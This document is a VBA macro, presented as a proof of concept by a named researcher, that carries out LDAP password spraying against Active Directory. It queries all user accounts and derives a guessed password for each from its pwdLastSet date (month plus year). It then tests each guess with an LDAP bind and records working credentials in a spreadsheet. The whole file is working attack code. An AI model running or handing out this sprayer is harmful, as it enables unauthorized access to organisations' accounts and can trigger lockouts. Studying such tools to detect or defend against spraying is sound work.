'LDAP password sprayer. It retrieve all users with a LDAP query (it can be improved ;D) and then try to authenticate via LDAP using a password based on the pwdLastSet attribute (December2020, January2020, etc.)
'PoC by Juan Manuel Fernandez (@TheXC3LL)

'Helper
Public Function toStr(pVar_In As Variant) As String
    On Error Resume Next
    toStr = CStr(pVar_In)
End Function

'Test Password via LDAP
Public Function checkPassword(target As String, password As String, domain As String) As Integer
    On Error Resume Next
    Set objIADS = GetObject("LDAP:").OpenDSObject("LDAP://" & domain, target, password, 1)
    If Err.Number = 0 Then
        checkPassword = 1
    Else
        checkPassword = 0
    End If
End Function
Sub LDAPSprayer() 'https://www.remkoweijnen.nl/blog/2007/11/01/query-active-directory-from-excel/
    'Get the domain string ("dc=domain, dc=local")
    Dim strDomain As String
    strDomain = GetObject("LDAP://rootDSE").Get("defaultNamingContext")

    'ADODB Connection to AD
    Dim objConnection As Object
    Set objConnection = CreateObject("ADODB.Connection")
    objConnection.Open "Provider=ADsDSOObject;"

    'Connection
    Dim objCommand As ADODB.Command
    Set objCommand = CreateObject("ADODB.Command")
    objCommand.ActiveConnection = objConnection

    'Search the AD recursively, starting at root of the domain
    objCommand.CommandText = _
        "<LDAP://" & strDomain & ">;(&(objectClass=user)(objectCategory=person));,sAMAccountName,pwdLastSet;subtree"
    Dim objRecordSet As ADODB.Recordset
    Set objRecordSet = objCommand.Execute

    Dim i As Long

    If objRecordSet.EOF And objRecordSet.BOF Then
    Else
        Dim c As Integer
        Dim prefix As String
        prefix = CreateObject("WScript.Network").UserDomain
        c = 1
        Do While Not objRecordSet.EOF
            For i = 0 To objRecordSet.Fields.Count - 1
                Cells(c, 1) = prefix & "\" & toStr(objRecordSet!sAMAccountName)
                If (objRecordSet!pwdLastSet.Value.HighPart = 0) And (objRecordSet!pwdLastSet.Value.LowPart = 0) Then
                        Cells(c, 2) = "Bad value!"
                        Cells(c, 2).Interior.Color = RGB(128, 0, 128)
                    Else
                        Dim password As String
                        'https://bytes.com/topic/visual-basic/answers/959361-active-directory-pwdlastset-value-issue
                        password = StrConv(Format(#1/1/1601# + (((objRecordSet!pwdLastSet.Value.HighPart * 2 ^ 32) + objRecordSet!pwdLastSet.Value.LowPart) / 600000000) / 1440, "mmmmyyyy"), vbProperCase)
                        If checkPassword(toStr(objRecordSet!sAMAccountName), password, strDomain) <> 0 Then
                            Cells(c, 2) = password
                            Cells(c, 2).Interior.Color = RGB(0, 255, 0)
                        Else
                            Cells(c, 2) = "Wrong Password!"
                            Cells(c, 2).Interior.Color = RGB(255, 0, 0)
                        End If
                        
                End If
            Next i
            objRecordSet.MoveNext
        c = c + 1
        Loop
    End If

    'Close connection
    objConnection.Close

    'Cleanup
    Set objRecordSet = Nothing
    Set objCommand = Nothing
    Set objConnection = Nothing
End Sub


